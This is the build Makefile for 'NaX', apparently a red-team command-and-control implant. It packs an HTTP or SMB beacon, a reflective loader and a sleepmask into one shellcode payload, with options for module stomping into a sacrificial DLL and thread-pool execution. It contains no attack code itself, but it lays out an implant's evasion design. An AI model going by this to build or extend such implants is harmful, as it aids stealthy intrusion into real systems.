# NaX/Makefile - top-level build: beacon + loader → combined nax.x64.bin
#
# Outputs:
#   build/nax.x64.bin         - release payload  (loader + beacon + unwind)
#   build/nax.x64.debug.bin   - debug payload    (loader + debug beacon + unwind)
#
# Sub-makes:
#   src_loader/Makefile  - Stardust-style UDRL (Start, PreMain, Main, Ldr)
#   src_beacon/Makefile  - PIC beacon (NaxMain, crypto, transport, commands)
#
# Usage:
#   make                      - build release → build/nax.x64.bin (v2 header, stomp off)
#   make debug                - build debug   → build/nax.x64.debug.bin
#   make MODULE_STOMP=1       - build with module stomping enabled
#   make STOMP_DLL=mshtml.dll - customize sacrificial DLL (default: chakra.dll)
#   make loader               - build loader only
#   make beacon               - build beacon only
#   make sleepmask            - build sleepmask BOF only
#   make clean                - remove all build artifacts

JOBS      ?= $(shell nproc 2>/dev/null || echo 4)
MAKEFLAGS += -s

PACK_SCRIPT      := scripts/pack_nax.py

LOADER_BIN       := src_loader/bin/nax_loader.x64.bin

# Transport-specific beacon build directory
NAX_TRANSPORT_PROFILE ?= 0
NAX_STOMP_ADVANCED    ?= 0
BEACON_TRANSPORT := NAX_TRANSPORT_PROFILE=$(NAX_TRANSPORT_PROFILE) NAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)

ifeq ($(NAX_TRANSPORT_PROFILE),1)
BEACON_BUILD     := src_beacon/build/smb
else
BEACON_BUILD     := src_beacon/build/http
endif

BEACON_BIN       := $(BEACON_BUILD)/beacon.x64.bin
BEACON_PDATA     := $(BEACON_BUILD)/beacon.pdata.bin
BEACON_XDATA     := $(BEACON_BUILD)/beacon.xdata.bin
BEACON_RVA       := $(BEACON_BUILD)/beacon.text_rva

BEACON_DEBUG_BIN   := $(BEACON_BUILD)/beacon.x64.debug.bin
BEACON_DEBUG_PDATA := $(BEACON_BUILD)/beacon.debug.pdata.bin
BEACON_DEBUG_XDATA := $(BEACON_BUILD)/beacon.debug.xdata.bin
BEACON_DEBUG_RVA   := $(BEACON_BUILD)/beacon.debug.text_rva

OUT_DIR          := build
OUT_BIN          := $(OUT_DIR)/nax.x64.bin
OUT_DEBUG_BIN    := $(OUT_DIR)/nax.x64.debug.bin

# Configurable module stomping (off by default for dev builds)
MODULE_STOMP     ?= 0
STOMP_DLL        ?= chakra.dll
STOMP_PDATA      ?= $(MODULE_STOMP)

# Technique selection (compile-time, passed to loader)
#   NAX_STOMP_MODE: 0=VirtualAlloc, 1=ModuleStomp
#   NAX_EXEC_MODE:  0=CreateThread, 1=ThreadPool (TppWorkerThread)
NAX_STOMP_MODE   ?= 1
NAX_EXEC_MODE    ?= 1

# Build pack flags from config
PACK_FLAGS :=
ifneq ($(MODULE_STOMP),0)
PACK_FLAGS += --module-stomp
endif
ifneq ($(STOMP_PDATA),0)
PACK_FLAGS += --stomp-pdata
endif

# Loader technique defines
LOADER_DEFINES := NAX_STOMP_MODE=$(NAX_STOMP_MODE) NAX_EXEC_MODE=$(NAX_EXEC_MODE) NAX_STOMP_ADVANCED=$(NAX_STOMP_ADVANCED)

.PHONY: all debug link debug-link loader beacon sleepmask debug-sleepmask clean \
        _sync-loader _sync-beacon _sync-beacon-debug

## ========= [ combined output ] =========

all: _sync-loader _sync-beacon | $(OUT_DIR)
	@if [ ! -f $(OUT_BIN) ] || \
	    [ $(LOADER_BIN) -nt $(OUT_BIN) ] || \
	    [ $(BEACON_BIN) -nt $(OUT_BIN) ]; then \
	    python3 $(PACK_SCRIPT) \
	        --loader $(LOADER_BIN) \
	        --beacon $(BEACON_BIN) \
	        --pdata  $(BEACON_PDATA) \
	        --xdata  $(BEACON_XDATA) \
	        --text-rva $(BEACON_RVA) \
	        --stomp-dll "$(STOMP_DLL)" \
	        $(PACK_FLAGS) \
	        --output $(OUT_BIN); \
	else \
	    echo "  SKIP  $(OUT_BIN) is up-to-date"; \
	fi

$(OUT_DIR):
	mkdir -p $(OUT_DIR)

## ========= [ debug combined output ] =========

debug: _sync-loader _sync-beacon-debug | $(OUT_DIR)
	@if [ ! -f $(OUT_DEBUG_BIN) ] || \
	    [ $(LOADER_BIN) -nt $(OUT_DEBUG_BIN) ] || \
	    [ $(BEACON_DEBUG_BIN) -nt $(OUT_DEBUG_BIN) ]; then \
	    python3 $(PACK_SCRIPT) \
	        --loader $(LOADER_BIN) \
	        --beacon $(BEACON_DEBUG_BIN) \
	        --pdata  $(BEACON_DEBUG_PDATA) \
	        --xdata  $(BEACON_DEBUG_XDATA) \
	        --text-rva $(BEACON_DEBUG_RVA) \
	        --stomp-dll "$(STOMP_DLL)" \
	        $(PACK_FLAGS) \
	        --output $(OUT_DEBUG_BIN); \
	else \
	    echo "  SKIP  $(OUT_DEBUG_BIN) is up-to-date"; \
	fi
	@if [ ! -f src_sleepmask/dist/sleepmask.x64.o ]; then \
	    $(MAKE) -j$(JOBS) -C src_sleepmask debug; \
	fi

## ========= [ sub-make sync targets ] =========

_sync-loader:
	@$(MAKE) -j$(JOBS) -C src_loader -f Makefile $(LOADER_DEFINES)

_sync-beacon:
	@$(MAKE) -j$(JOBS) -C src_beacon $(BEACON_TRANSPORT)

_sync-beacon-debug:
	@$(MAKE) -j$(JOBS) -C src_beacon debug $(BEACON_TRANSPORT)

## ========= [ sub-makes ] =========

loader:
	$(MAKE) -j$(JOBS) -C src_loader -f Makefile $(LOADER_DEFINES)

sleepmask:
	$(MAKE) -j$(JOBS) -C src_sleepmask

debug-sleepmask:
	$(MAKE) -j$(JOBS) -C src_sleepmask debug

beacon:
	$(MAKE) -j$(JOBS) -C src_beacon $(BEACON_TRANSPORT)

## ========= [ link-only (recompile Config.c + re-link) ] =========

link: _sync-loader | $(OUT_DIR)
	$(MAKE) -j$(JOBS) -C src_beacon link $(BEACON_TRANSPORT)
	python3 $(PACK_SCRIPT) \
	    --loader $(LOADER_BIN) \
	    --beacon $(BEACON_BIN) \
	    --pdata  $(BEACON_PDATA) \
	    --xdata  $(BEACON_XDATA) \
	    --text-rva $(BEACON_RVA) \
	    --stomp-dll "$(STOMP_DLL)" \
	    $(PACK_FLAGS) \
	    --output $(OUT_BIN)

debug-link: _sync-loader | $(OUT_DIR)
	$(MAKE) -j$(JOBS) -C src_beacon debug-link $(BEACON_TRANSPORT)
	python3 $(PACK_SCRIPT) \
	    --loader $(LOADER_BIN) \
	    --beacon $(BEACON_DEBUG_BIN) \
	    --pdata  $(BEACON_DEBUG_PDATA) \
	    --xdata  $(BEACON_DEBUG_XDATA) \
	    --text-rva $(BEACON_DEBUG_RVA) \
	    --stomp-dll "$(STOMP_DLL)" \
	    $(PACK_FLAGS) \
	    --output $(OUT_DEBUG_BIN)

## ========= [ component-only targets (for Go packer) ] =========

components: _sync-loader _sync-beacon
	@echo "[+] components ready"

debug-components: _sync-loader _sync-beacon-debug
	@echo "[+] debug components ready"

link-components: _sync-loader
	$(MAKE) -j$(JOBS) -C src_beacon link $(BEACON_TRANSPORT)
	@echo "[+] link components ready"

debug-link-components: _sync-loader
	$(MAKE) -j$(JOBS) -C src_beacon debug-link $(BEACON_TRANSPORT)
	@echo "[+] debug-link components ready"

## ========= [ clean ] =========

clean:
	$(MAKE) -j$(JOBS) -C src_loader -f Makefile clean
	$(MAKE) -j$(JOBS) -C src_beacon clean
	@echo "  NOTE  src_sleepmask/dist/ kept (pre-built .o, source is WIP)"
	rm -rf $(OUT_DIR)
